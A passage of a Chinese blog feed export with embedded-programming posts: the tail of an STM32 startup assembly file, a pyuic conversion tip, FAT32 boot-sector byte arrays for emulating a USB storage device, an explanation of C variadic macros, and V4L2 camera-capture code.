                ENDP
SysTick_Handler PROC
                EXPORT  SysTick_Handler                [WEAK]
                B       .
                ENDP

Default_Handler PROC

                EXPORT  WWDG_IRQHandler                [WEAK]
                EXPORT  PVD_VDDIO2_IRQHandler          [WEAK]
                EXPORT  RTC_IRQHandler                 [WEAK]
                EXPORT  FLASH_IRQHandler               [WEAK]
                EXPORT  RCC_CRS_IRQHandler             [WEAK]
                EXPORT  EXTI0_1_IRQHandler             [WEAK]
                EXPORT  EXTI2_3_IRQHandler             [WEAK]
                EXPORT  EXTI4_15_IRQHandler            [WEAK]
                EXPORT  TSC_IRQHandler                  [WEAK]
                EXPORT  DMA1_Channel1_IRQHandler       [WEAK]
                EXPORT  DMA1_Channel2_3_IRQHandler     [WEAK]
                EXPORT  DMA1_Channel4_5_IRQHandler     [WEAK]
                EXPORT  ADC1_IRQHandler                [WEAK]
                EXPORT  TIM1_BRK_UP_TRG_COM_IRQHandler [WEAK]
                EXPORT  TIM1_CC_IRQHandler             [WEAK]
                EXPORT  TIM2_IRQHandler                [WEAK]
                EXPORT  TIM3_IRQHandler                [WEAK]
                EXPORT  TIM14_IRQHandler               [WEAK]
                EXPORT  TIM16_IRQHandler               [WEAK]
                EXPORT  TIM17_IRQHandler               [WEAK]
                EXPORT  I2C1_IRQHandler                [WEAK]
                EXPORT  SPI1_IRQHandler                [WEAK]
                EXPORT  SPI2_IRQHandler                [WEAK]
                EXPORT  USART1_IRQHandler              [WEAK]
                EXPORT  USART2_IRQHandler              [WEAK]
                EXPORT  CEC_CAN_IRQHandler             [WEAK]
                EXPORT  USB_IRQHandler                 [WEAK]


WWDG_IRQHandler
PVD_VDDIO2_IRQHandler
RTC_IRQHandler
FLASH_IRQHandler
RCC_CRS_IRQHandler
EXTI0_1_IRQHandler
EXTI2_3_IRQHandler
EXTI4_15_IRQHandler
TSC_IRQHandler
DMA1_Channel1_IRQHandler
DMA1_Channel2_3_IRQHandler
DMA1_Channel4_5_IRQHandler
ADC1_IRQHandler 
TIM1_BRK_UP_TRG_COM_IRQHandler
TIM1_CC_IRQHandler
TIM2_IRQHandler
TIM3_IRQHandler
TIM14_IRQHandler
TIM16_IRQHandler
TIM17_IRQHandler
I2C1_IRQHandler
SPI1_IRQHandler
SPI2_IRQHandler
USART1_IRQHandler
USART2_IRQHandler
CEC_CAN_IRQHandler
USB_IRQHandler   

                B       .

                ENDP

                ALIGN

;*******************************************************************************
; User Stack and Heap initialization
;*******************************************************************************
                 IF      :DEF:__MICROLIB
                
                 EXPORT  __initial_sp
                 EXPORT  __heap_base
                 EXPORT  __heap_limit
                
                 ELSE
                
                 IMPORT  __use_two_region_memory
                 EXPORT  __user_initial_stackheap
                 
__user_initial_stackheap

                 LDR     R0, =  Heap_Mem
                 LDR     R1, =(Stack_Mem + Stack_Size)
                 LDR     R2, = (Heap_Mem +  Heap_Size)
                 LDR     R3, = Stack_Mem
                 BX      LR

                 ALIGN

                 ENDIF

                 END

;************************ (C) COPYRIGHT STMicroelectronics *****END OF FILE*****





后记

无
参考文献
无





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
      </categories>
      <tags>
        <tag>ARM</tag>
        <tag>stm32</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu(Linux) PyQt5 QtUIFile 转换为 PythonModule (pyuic.py/pyuic脚本)</title>
    <url>/2016/12/01/blog_idx_030/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  无




PyQt5

  在我的《PyQt5 Ubuntu 16.04/14.04 环境配置》（https://sky-x.blog.csdn.net/article/details/53422190） 中配置和测试了pyqt5，但是在我们实际开发GUI时，我们要借助QtCreator这个非常好的工具来画出我们UI的初始样子。
  之后我们会得到一个UI文件，这时候我们需要借助PyQt5所带的一个工具Pyuic脚本将UI文件转换为PythonModule文件。
  在我的教程安装之后，pyuic脚本位置在/usr/lib/python3/dist-packages/PyQt5/uic 目录。如图：

    
        
    
    
bash中执行：
alias pyuic5="python3 -m PyQt5.uic.pyuic"
  这下，你就可以在bash中使用pyuic5 来转换ui文件为 pythonmodule
  如图实例：
  QtCreator：

    
        
    
    
  pyuic转换:

    
        
    
 
  form.py，module文件:

    
        
    
 
  测试文件，my.py：

    
        
    
 
  最后效果：

    
        
    
 
  所有文件打包下载：http://download.csdn.net/detail/u011728480/9699105




后记

无
参考文献
无





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>GUI开发</category>
        <category>python</category>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>pyqt</tag>
        <tag>ui</tag>
        <tag>pyuic</tag>
      </tags>
  </entry>
  <entry>
    <title>FAT32 文件系统详解</title>
    <url>/2017/02/27/blog_idx_031/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  最近有个项目是做STM32裸机开发的，由于需要用到USB向android系统传输数据，先考虑USB HID Class，但是考虑到驱动和后续要支持读取SD问题，进而采用USB MS Class作为传输数据的载体。模拟一个带FAT32文件系统的存储设备。
  模拟设备基本信息:总容量8MB，除去MBR,DBR,FSINFO,FAT,等，大概还有7.8MB左右的容量。
  这篇文章主要用于讲解FAT32的详细结构，同时也详解存储介质和文件系统的关系。读这篇文章时，以假设你对FAT32 具备一定的了解，至少你知道FAT32由哪些地方组成。现在网上的资料，就我查询来看，都没有介绍MBR，大部分都直接从DBR开始讲起来,而模拟一个存储设备，MBR是一切的起点，只要搞清楚MBR，我们就可以顺着线，了解所有。如果对文中的一些词语不了解，请多百度。
  此外，此文章是我查看许多资料而融合而来，向前人致敬！！！




FAT FileSystem



存储介质
  由于我们的存储介质是由存储载体（磁面或者存储芯片）和 读写机构组成。如硬盘的磁面和磁头部分等等。这就解决了怎么物理级读取数据的问题，而操作系统的存储驱动正是做这个事情的。驱动提供接口让我们可以在存储介质上读写数。
  我们虽然可以通过驱动向存储介质写数据，但是都是很低级的写，同时，我们写入的大部分是文件，而很少有人直接往磁盘保存文件中的二进制数据吧，而不保存文件的其他信息吧，并且这样是很难管理的（如：我要取一个文件，就是说我要的是人记住这个文件在存储介质的那个位置，是那几个字节）。为了方便管理，有了文件系统的概念，文件系统可以提供方便的存储文件各种信息的方法。
  FAT文件系统是一个小容量类常用的文件系统，容量太大了就不太适合使用FAT系文件系统。FAT有FAT12，FAT16,FAT32，我们今天主要就是介绍FAT32.


FAT32
  由于网上这方面的资料很多，我主要是介绍一些网上现有资料让我迷惑的一些地方。同时通过代码的方式，让我们知道各个组成部分到底是怎么回事。
  FAT32 由 MBR,DBR,FSINFO,FAT1,FAT2,DATA(DATA = DIR + FILE_DATA) 组成。
  MBR是主引导记录，主要作用是为了标示一个分区的信息而设立的。MBR结构如下：
//0 扇区
uint8_t FAT32_MBR[80]=&#123;
	0x00,0x00,0x00,0x00/**/,0x00,0x00,0x00,0x00/**/,0x00,0x00,0x00,0x00/**/,0x00,0x00,/*DPT 开始位*/0x80/**/,0x01/**/,
	0x01/**/,0x00,0x0B,0xFE/**/,0x3F,0x00,  0x3F,0x00,0x00,0x00/*4bytes下个分区的扇区地址*/,  0x82,0x3e,0x00,0x00/*4bytes为SD卡总的扇区个数(16002个)*/,0x00,0x00/**/,
	0x00,0x00,0x00,0x00/**/,0x00,0x00,0x00,0x00/**/,0x00,0x00,0x00,0x00/**/,0x00,0x00,0x00,0x00/**/,
	0x00,0x00,0x00,0x00/**/,0x00,0x00,0x00,0x00/**/,0x00,0x00,0x00,0x00/**/,0x00,0x00,0x00,0x00/**/,
	0x00,0x00,0x00,0x00/**/,0x00,0x00,0x00,0x00/**/,0x00,0x00,0x00,0x00/**/,0x00,0x00,0x55,0xAA/**/,

&#125;;
  MBR决定DBR的起始位置,DBR存储FAT表信息。DBR如下：
//DOS BOOT RECORD
//DBR=引导代码+BPB+扩展BPB+校验
//FAT1 = 63+34
//FAT2 = 63+34+123 = 220
//DATA = 63+34+123+123 = 343
//ROOT-DIR = 343
uint8_t FAT32_DBR[96]=&#123;
	
	0xEB,0x58,0x90/*(0x0-0x2)跳转指令*/,0x4D,0x53,0x44,0x4F,0x53,0x35,0x2E,0x30/*（0x3-0xA）OEM区域:MSDOS5.0*/,0x00,0x02/*（0xB-0xC）每扇区字节数*/,0x01/*（0xD）每簇扇区数*/,0x22,0x00/*(0xE-0xF)保留扇区数*/,
	0x02/*(0x10)FAT数(Number of FAT) 该分区上FAT的副本数*/,0x00,0x00/*（0x11-0x12）FAT32必须等于0，FAT12/FAT16为根目录中目录的个数；*/,0x00,0x00/*(0x13-0x14)FAT32必须等于0，FAT12/FAT16为扇区总数*/,0xF8/*(0x15),哪种存储介质，0xF8标准值，可移动存储介质，常用的 0xF0*/,0x00,0x00/*(0x16-0x17)FAT32必须为0，FAT12/FAT16为一个FAT 表所占的扇区数*/,0x3F,0x00/*(0x18-0x19)每磁道扇区数，只对于有“特殊形状”（由磁头和柱面每 分割为若干磁道）的存储介质有效，63（0x00 3F）*/,0xFF,0x00/*(0x1A-0x1B)磁头数，只对特殊的介质才有效，255（0x00 FF）。*/,0x3F,0x00,0x00,0x00/*(0x1C-0x1F)DBR分区之前所隐藏的扇区数，63，与MBR中地址0x1C6开始的4个字节数值相等*/,
	0x82,0x3E,0x00,0x00/*(0x20-0x23)文件系统总扇区数，16002*/,0x7B,0x00,0x00,0x00/*(0x24-0x27)每个FAT表占用扇区数，123*/,0x00,0x00/*(0x28-0x29),标记，此域FAT32 特有*/,0x00,0x00/*(0x2A-0x2B)FAT32版本号0.0，FAT32特有*/,0x02,0x00,0x00,0x00/*(0x2C-0x2F),根目录所在第一个簇的簇号，2。（虽然在FAT32文件系统 下，根目录可以存放在数据区的任何位置，但是通常情况下还是起始于2号簇） */,
	0x01,0x00/*(0x30-0x31),FSINFO（文件系统信息扇区）扇区号1，该扇区为操作 系统提供关于空簇总数及下一可用簇的信息*/,0x06,0x00/*(0x32-0x33),备份引导扇区的位置。备份引导扇区总是位于文件系统 的6号扇区*/,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00/*(0x34-0x3F),用于以后FAT 扩展使用*/,
	0x80,0x00/*(0x40-0x41),与FAT12/16 的定义相同，只不过两者位于启动扇区不同的位置而已*/,0x29/*(0x42),扩展引导标志，0x29。与FAT12/16 的定义相同*/,0xAF,0xE3,0xB5,0x10/*(0x43-0x46),卷序列号。通常为一个随机值*/,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
	0x20,0x20/*(0x47-0x51)卷标（ASCII码），如果建立文件系统的时候指定了卷 标，会保存在此*/,0x46,0x41,0x54,0x33,0x32,0x20,0x20,0x20/*(0x52-0x59)文件系统格式的ASCII码，FAT32*/,0x00,0x00,0x00,0x00,0x00,0x00,&#125;;

  FSINFO如下：
//文件系统信息扇区，位于DBR 后一个扇区
//64扇区
uint8_t FAT32_FSINFO[48]=&#123;
	0x52,0x52,0x61,0x41/*扩展引导标签*/,0x00,0x00,0x00,0x00/**/,0x00,0x00,0x00,0x00/**/,0x00,0x00,0x00,0x00/**/,
	0x00,0x00,0x00,0x00/**/,0x72,0x72,0x41,0x61/*FSINFO签名“0x72724161”*/,0x66,0x3D,0x00,0x00/*文件系统的空簇数，15788*/,0x15,0x00,0x00,0x00/*下一可用簇号（0x 00 00 00 15）*/,
	0x00,0x00,0x00,0x00/**/,0x00,0x00,0x00,0x00/**/,0x00,0x00,0x00,0x00/**/,0x00,0x00,0x55,0xAA/**/,
&#125;;
  FAT表存储哪些簇已经被分配, FAT表如下：
//97扇区，FAT1
//220,FAT2
uint8_t FAT32_FAT[28]=&#123;
	0xF8,0xFF,0xFF,0x0F, 0xFF,0xFF,0xFF,0xFF, 0xFF,0xFF,0xFF,0x0F, 0x04,0x00,0x00,0x00 , 
	0x05,0x00,0x00,0x00, 0x06,0x00,0x00,0x00, 0xFF,0xFF,0xFF,0x0F
	
&#125;;
  同理通过DBR和FAT表我们可以推算出DIR所在的扇区，同时，也可以推算出DATA所在的扇区，然后我们就可以模拟一个带FAT32文件系统的存储设备。
  注意:文中的一些地方要结合其他的FAT32文章基础来看，我只是很直白的表达了，到底介质上存了什么才会让OS认出这就是FAT32，容量多大。




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>常识</category>
      </categories>
      <tags>
        <tag>数据</tag>
        <tag>文件系统</tag>
        <tag>存储</tag>
        <tag>STM32</tag>
      </tags>
  </entry>
  <entry>
    <title>C 可变参数函数分析(va_start,va_end,va_list...)</title>
    <url>/2017/03/14/blog_idx_032/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  在几年前，由于兴趣需要，去研究了c的不定参数问题，当时由于太懒，没有记录任何资料，导致现在实际需要的时候，又要重新来过。呜呼哀哉，太烦了～～～～～～～




c/cpp不定参数

  首先，c不定参数所定义的宏的头文件在 stdarg.h中。在我的系统中在这里：/usr/lib/gcc/x86_64-linux-gnu/5/include/stdarg.h,源码我就不贴了，就简要分析几个重要宏的原理。
//va_list  //此宏依赖与不同的平台和操作系统。
    //常用定义:(具体和编译器有关，其实了解透后，都差不多)
    typedef char *  __builtin_va_list;//（注意可能是这样定义的）
    (or)
    typedef void *  __builtin_va_list;//（注意可能是这样定义的）
    typedef __builtin_va_list __gnuc_va_list;  
    typedef __gnuc_va_list va_list；


//_INTSIZEOF(n) //此宏是windows上定义的，目的是为了考虑兼容一些内存地址对齐的系统，n应该占多少字节，如：arm指令集是4字节对齐访问，Thumb指令集是24字节对齐访问.在linux上，gcc编译器会内部定义一个类似的宏，来代表对齐的字节数。其用法是为了根据一个确定的参数，来依次确定不定参数中的每一个参数。
    #define  _INTSIZEOF(n) \
        ( (sizeof(n) + sizeof(int) - 1) &amp; ~(sizeof(int) - 1) )
    //一般在一个操作系统中，int类型所占的字节数即为当前对齐的字节数，一般为4或者8。关于此宏的详细分析，以下的分析来至于网上，带入sizeof(n) = 4,8即可明白：
    #define  _INTSIZEOF(n)  ((sizeof(n) + x) &amp; ~(x))
    x = sizeof(int) - 1 = 3 = 0000 0000 0000 0011(b)
    ~x = 1111 1111 1111 1100(b)

//va_start(v,l) //此宏获取的是可变参数中的第一个参数的地址
    #define __builtin_va_start(v,l) \
            ( v = (va_list)&amp;l + _INTSIZEOF(l) )//（注意可能是这样定义的），l的地址加上l地址所占的空间
    #define va_start(v,l)   __builtin_va_start(v,l)
	
//va_arg(v,l)//此宏是使下一个可变参数的地址赋值给v,同时返回开始时v地址所指向的值，注意：此时v已经指向下一个参数地址，但是表达式返回的值是初始v的值，《《这里只需要搞清楚括号优先级就能够明白》》。
    #define __builtin_va_arg(v,l) \
            ( *(l *)((v += _INTSIZEOF(l)) - _INTSIZEOF(l)) )//（注意可能是这样定义的）
    #define va_arg(v,l) __builtin_va_arg(v,l)
		
//va_end(v)//此宏处理va_list声明的一个指针，防止出现野指针。有始有终。
    #define __builtin_va_end(v)\
        ( v = (va_list)0 )
    #define va_end(v)   __builtin_va_end(v)



来个例子(t.c)
#include &lt;stdarg.h>
#include &lt;stdio.h>

void ttt(char * fuk,...);

int main(int argc, char * argv[])&#123;
    ttt("fuk",2333,"this is 23333333333333333");
    return 0;
&#125;
void ttt(char * fuk,...)&#123;

	va_list arg;
	int a;
	char *b;
	va_start(arg,fuk);
	a = va_arg(arg,int);
	b = va_arg(arg,char *);
	va_end(arg);

	printf("%d,%s\n",a,b);
&#125;
编译
gcc t.c
./a.out

    
        
    
    




后记

最后的注意：


变参函数必须有一个以上的指定参数


变参的《《类型》》必须通过一定方式已知（如格式化字符串,&quot;%d,%s&quot;等等），否则就是定死的


变参的《《个数》》也必须通过一定方式已知（如格式化字符串,&quot;%d,%s&quot;等等），否则就是定死的


c的函数参数入栈方式是从右到左，栈的地址一般是从高到底。


参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>C&amp;CPP</category>
      </categories>
      <tags>
        <tag>c语言</tag>
        <tag>函数</tag>
        <tag>可变参数</tag>
      </tags>
  </entry>
  <entry>
    <title>毕设系列之Linux V4L2（图形图像采集篇）</title>
    <url>/2017/07/02/blog_idx_034/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  Ubuntu 16.04 LTS
前言

  无




V4L2



V4L2 介绍
  虽然介绍Linux V4L2的文章已经满大街了，但是这里我也还要讲一些基本的东西。


v4l2 是Video for Linux 2的简称。


v4l2 不仅仅支持图像类设备，还支持音频等设备类型。


能够使用v4l2的前提是Linux内核已经识别并注册了了相关的设备，常见的就是/dev/videox类似的设备文件存在。（如果是做图像类的采集，说白了你得有个摄像头，这个摄像头还得被Linux 内核识别）


从上文可知，一个设备要被内核识别必须要由驱动才行，而对于我们常用的图像采集来说，就是要有一个摄像头驱动才行。对于这个问题，linux内核工作者根据UVC这个标准开发了一个通用的驱动程序，并且整合到linux内核中。只要是支持UVC这个通用标准的摄像头芯片，就能够使用这个驱动。（非图像类也有类似的存在，具体这里不做多余阐述）


一般来说，常用的Linux平台是的内核是已经编译进去了UVC驱动的。如果是自己移植的嵌入式Linux 内核，请在配置内核选项时候打开UVC驱动的选项。如下图：



    
        
    
  


V4L2框架简介
  V4L2这个框架的原理简述（这里我们只需要关注几个结构体就可以,要深入，去看内核源代码）


struct v4l2_device v4l2框架中的根节点，主要是用来管理和遍历其它子节点。


struct v4l2_subdev v4l2框架中的子节点，在v4l2_device下可以有多个v4l2_subdev存在，这里主要是区分设备类型，如图像或者音频等等。


struct video_device 具体设备的结构体，并在/dev/下创建相关的设备文件。


struct v4l2_buffer 为设备数据交换提供空间。


  原理（这里以USB摄像头为例）：当一个设备接入内核，首先根据USB标准协议对USB进行初始化，最终完成USB设备信息探测。根据USB设备信息，内核给其分配相应的驱动。这里内核知道我们的USB设备是一个图像设备，这时内核开始初始化v4l2_subdev结构体，并且类型设置为图形图像设备。当初始化好后，内核继续初始化一个video_device结构体，并插入到v4l2_subdev的管理链表中。这里的初始化过程中，就要涉及摄像头驱动的加载，设备文件的创建等等。到这里，整个注册环节就结束了，意味着我们可以使用v4l2框架来操作我们的设备。操作的话，就是各种ops的调用就ok了。（这里涉及到usb设备驱动的初始化和字符型设备驱动等等相关知识，需要更多，自行查阅资料）


V4L2的使用
  V4L2的使用（没啥可讲的，各种资料烂大街了，我直接贴源代码）
ym_v4l2.c文件
/*
	FileName:m_v4l2.c
	Version:1.5
	Description:
	Created On: 2017-2-21
	Modified date:2017-3-14
	Author:Sky
*/
#include &lt;ym_v4l2.h>
int yInitMV4l2(const char * pathname, yMV4L2 * mv4l2)&#123;
	
	//mv4l2 = mvl;
	//request alloc IMG_BUFF_NUM DATA_BUF size mem
    if ( (mv4l2->img_buf = (IMG_BUF *)calloc(IMG_BUFF_NUM, sizeof(IMG_BUF))) == NULL)&#123;
        printf("calloc  failed\n");
        return -1;
    &#125;
	if ( (mv4l2->camera_fd = open(pathname, O_RDWR | O_NONBLOCK)) &lt; 0)&#123;//open video device
    
        perror("Open video device faild");
        return -1;
    &#125;
	
	return 0;
&#125;
int yIoctlV4l2(enum yV4l2Cmd cmd,...)&#123;

    va_list arg;
    va_start(arg,cmd);
    yMV4L2 *mv4l2;
    mv4l2 = va_arg(arg,yMV4L2 *);
    va_end(arg);
    switch(cmd)&#123;
    
        case yVIDIOC_QUERYCAP:
        &#123;
    	    if ( ioctl(mv4l2->camera_fd, VIDIOC_QUERYCAP, &amp;mv4l2->cap) &lt; 0)&#123;
        
                 perror("QUERY VIDEO CAP FAILED");
                return -1;
            &#125;
	        printf("DriverName:%s/nCard Name:%s/nBusinfo:%s/nDriverVersion:%u.%u.%u\n",mv4l2->cap.driver,mv4l2->cap.card,mv4l2->cap.bus_info,(mv4l2->cap.version>>16)&amp;0XFF,(mv4l2->cap.version>>8)&amp;0xFF,mv4l2->cap.version&amp;0xFF);
            if ( !(mv4l2->cap.capabilities &amp; V4L2_BUF_TYPE_VIDEO_CAPTURE) )&#123;
    
                printf("The device is not a video capture\n");
                return -1;
            &#125;
            if ( !(mv4l2->cap.capabilities &amp; V4L2_CAP_STREAMING) )&#123;
        
                 printf("The device can not support streaming i/o\n");
                return -1;
            &#125;
            break;
        &#125; 
        case yVIDIOC_ENUM_FMT:
        &#123;
        	CLEAR_MEM(mv4l2->desc_fmt);
            mv4l2->desc_fmt.index = 0;
            mv4l2->desc_fmt.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
            while( ioctl(mv4l2->camera_fd, VIDIOC_ENUM_FMT,&amp;mv4l2->desc_fmt) == 0 )&#123;
    
                printf("index : %d, format:%s \n", mv4l2->desc_fmt.index,mv4l2->desc_fmt.description);
		        mv4l2->desc_fmt.index++;
            &#125;
            break;
        &#125; 
        case yVIDIOC_S_FMT:
        &#123;
			// set data format for dev
    		mv4l2->stream_fmt.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    		mv4l2->stream_fmt.fmt.pix.width = IMAGE_WIDTH;
    		mv4l2->stream_fmt.fmt.pix.height = IMAGE_HEIGHT;
    		mv4l2->stream_fmt.fmt.pix.pixelformat = V4L2_PIX_FMT_YUYV;
    		//mv4l2->stream_fmt.fmt.pix.field = V4L2_FIELD_INTERLACED;
			mv4l2->stream_fmt.fmt.pix.field = V4L2_FIELD_ANY;
			if ( ioctl(mv4l2->camera_fd, VIDIOC_S_FMT, &amp;mv4l2->stream_fmt)  )&#123;
    
       			perror("Set data format failed");
        		return -1;
    		&#125;
           	break;
        &#125; 
        case yVIDIOC_G_FMT:
        &#123;
			CLEAR_MEM(mv4l2->stream_fmt);
			mv4l2->stream_fmt.type=V4L2_BUF_TYPE_VIDEO_CAPTURE;  
			ioctl(mv4l2->camera_fd,VIDIOC_G_FMT,&amp;mv4l2->stream_fmt);  
			printf("Currentdata format information: width:%d   height:%d\n",mv4l2->stream_fmt.fmt.pix.width,mv4l2->stream_fmt.fmt.pix.height); 
           	break;
        &#125; 
        case yVIDIOC_REQBUFS:
        &#123;
	    //bzero(&amp;reqbuf, sizeof(reqbuf));
			CLEAR_MEM(mv4l2->reqbuf);
			mv4l2->reqbuf.count = IMG_BUFF_NUM;
    		mv4l2->reqbuf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    		mv4l2->reqbuf.memory = V4L2_MEMORY_MMAP;
    
    		if ( ioctl(mv4l2->camera_fd, VIDIOC_REQBUFS, &amp;mv4l2->reqbuf) &lt; 0 )&#123;
    
        		perror("ioctl REQBUFS failed");
        		return -1;
    		&#125;
           	break;
        &#125;    
        case yVIDIOC_STREAMON:
        &#123;
			mv4l2->type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    		if ( ioctl(mv4l2->camera_fd, VIDIOC_STREAMON,&amp;mv4l2->type)&lt; 0)&#123;
            
            	perror("Failed to ioctl:VIDIOC_STREAMON");
            	return -1;
    		&#125;
           	break;
        &#125;
        case yVIDIOC_STREAMOFF:
        &#123;
    		mv4l2->type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    		if ( ioctl(mv4l2->camera_fd, VIDIOC_STREAMOFF,&amp;mv4l2->type)&lt; 0)&#123;
            
            	perror("Failed to ioctl:VIDIOC_STREAMOFF");
            	return -1;
    		&#125;
           	break;
        &#125; 
        case yVIDIOC_S_PARM:
        &#123;
			CLEAR_MEM(mv4l2->stream_parm);
			mv4l2->stream_parm.type = V4L2_BUF_TYPE_VIDEO_CAPTURE; 
	
			mv4l2->stream_parm.parm.capture.timeperframe.numerator = 1;
			mv4l2->stream_parm.parm.capture.timeperframe.denominator = 10;
			if ( ioctl(mv4l2->camera_fd, VIDIOC_S_PARM, &amp;mv4l2->stream_parm) &lt; 0)&#123;

				perror("Failed to ioctl:VIDIOC_S_PARM");
        		return -1;
			&#125;
           	break;
        &#125; 
        case yVIDIOC_G_PARM:
        &#123;
			CLEAR_MEM(mv4l2->stream_parm);
			mv4l2->stream_parm.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;

			if ( ioctl(mv4l2->camera_fd, VIDIOC_G_PARM, &amp;mv4l2->stream_parm) &lt; 0)&#123;

				perror("Failed to ioctl:VIDIOC_G_PARM");
        		return -1;
			&#125;
			if (  mv4l2->stream_parm.parm.capture.capability == V4L2_CAP_TIMEPERFRAME )&#123;
				printf("This Video Support Set Fps,Now-Fps is : %d\n",mv4l2->stream_parm.parm.capture.timeperframe.denominator);
			&#125;
			else&#123;
				printf("This Video Un-Support Set Fps\n");
			&#125;
           	break;
        &#125;
        case yVIDIOC_DQBUF:
        &#123;
			//bzero(&amp;normal_buf, sizeof(normal_buf));
			CLEAR_MEM(mv4l2->normal_buf);
    		mv4l2->normal_buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    		mv4l2->normal_buf.memory = V4L2_MEMORY_MMAP;
    		if ( ioctl(mv4l2->camera_fd, VIDIOC_DQBUF, &amp;mv4l2->normal_buf) &lt; 0)&#123;

        		perror("Failed to ioctl:VIDIOC_DQBUF");
        		return -1;
    
    		&#125; 
           	break;
        &#125; 
        case yVIDIOC_QBUF:
        &#123;
			if ( ioctl(mv4l2->camera_fd, VIDIOC_QBUF, &amp;mv4l2->normal_buf) &lt; 0)&#123;

             	perror("Failed to ioctl:VIDIOC_QBUF");
            	return -1;
    		&#125; 
           	break;
        &#125;
		case yMMAPTOVEDIOBUF:
		&#123;
			for ( int i=0; i &lt; IMG_BUFF_NUM; i++ )&#123;
    
        		//bzero(&amp;normal_buf, sizeof(normal_buf));
				CLEAR_MEM(mv4l2->normal_buf);
        		mv4l2->normal_buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
        		mv4l2->normal_buf.memory = V4L2_MEMORY_MMAP;
        		mv4l2->normal_buf.index = i;
        		//get kernel cache information
        
        		if ( ioctl(mv4l2->camera_fd, VIDIOC_QUERYBUF,&amp;mv4l2->normal_buf) &lt; 0)&#123;
            
            		perror("Failed to ioctl:VIDIOC_QUERYBUF");
            		return -1;
        		&#125;
        		mv4l2->img_buf[i].len = mv4l2->normal_buf.length;
        		mv4l2->img_buf[i].start = mmap(NULL,mv4l2->normal_buf.length,
                	PROT_READ|PROT_WRITE,
                    MAP_SHARED,mv4l2->camera_fd,
                    mv4l2->normal_buf.m.offset);

        		if ( MAP_FAILED == mv4l2->img_buf[i].start)&#123;
            
            		perror("Failed to mmap");
            		return -1;
        		&#125;
    		&#125;
			break;
		&#125;
		case yPUTVEDIOALLBUFTOQUEUE:
		&#123;
			    //bzero(&amp;normal_buf, sizeof(normal_buf));
			for ( int i = 0; i &lt; IMG_BUFF_NUM;i++)&#123;
        
				CLEAR_MEM(mv4l2->normal_buf);
    			mv4l2->normal_buf.index = i;
    			mv4l2->normal_buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    			mv4l2->normal_buf.memory = V4L2_MEMORY_MMAP;
    			if ( ioctl(mv4l2->camera_fd, VIDIOC_QBUF,&amp;mv4l2->normal_buf) &lt; 0)&#123;
            
        			perror("Failed to ioctl:VIDIOC_QBUF");
        			return -1;
    			&#125;
          
			&#125;  
			break;
		&#125;
		case yUNMMAPTOVEDIOBUF:
		&#123;
			for (int i = 0; i &lt; IMG_BUFF_NUM; i++)&#123;

    			if ( munmap(mv4l2->img_buf[i].start,mv4l2->img_buf[i].len) &lt; 0)&#123;

            	perror("Failed to munmap");

            	return -1;

    			&#125;

    		&#125;  
			break;
		&#125;
        default :
        &#123;
            return -1;
            break;
        &#125; 

        
    &#125;

    return 0;
&#125;

int yDestroyMV4l2(yMV4L2 *mv4l2)&#123;
	
	//StopStream();
	yIoctlV4l2(yVIDIOC_STREAMOFF,mv4l2);
	//UnMMapToVedioBUf(mv4l2);
	yIoctlV4l2(yUNMMAPTOVEDIOBUF,mv4l2);
	close(mv4l2->camera_fd);
	free(mv4l2->img_buf);
	return 0;
&#125;
ym_v4l2.h
/*
	FileName:ym_v4l2.h
	Version:1.5
	Description:
	Created On: 2017-2-21
	Modified date:2017-3-14
	Author:Sky
*/

#ifndef _YM_V4L2_H
#define _YM_V4L2_H

#ifdef __cplusplus
#if __cplusplus
extern "C"&#123;
#endif
#endif /* __cplusplus */

#include &lt;ym_v4l2_config.h>
//open
#include &lt;sys/types.h>
#include &lt;sys/stat.h>
#include &lt;fcntl.h>
//memset
#include &lt;string.h>
//v4l2
#include &lt;linux/videodev2.h>
//errno
#include &lt;errno.h>
//perror
#include &lt;stdio.h>
//calloc,free
#include &lt;stdlib.h>
//close
#include &lt;unistd.h>
//ioctl
